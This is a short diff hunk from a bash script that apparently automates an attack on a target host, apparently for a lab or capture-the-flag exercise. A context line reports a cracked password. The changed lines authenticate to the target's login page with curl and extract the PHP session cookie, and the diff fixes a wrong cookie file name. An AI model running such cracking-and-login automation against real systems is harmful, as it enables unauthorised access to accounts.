@@ -40,7 +40,7 @@ echo "Password cracked : $PASSWORD"
 # Initiate php session
 echo "5 - AUTHENTICATE ON WEBSITE"
 curl -s -X GET "http://$target_ip:81/login.php" -c "/work/cookie-cf.txt" -L > /dev/null
-PHPSESSID=$(grep PHPSESSID "/work/cookie-bac.txt" | awk '{print $7}')
+PHPSESSID=$(grep PHPSESSID "/work/cookie-cf.txt" | awk '{print $7}')
 echo "Session initiated : $PHPSESSID"
 
 # Authenticate
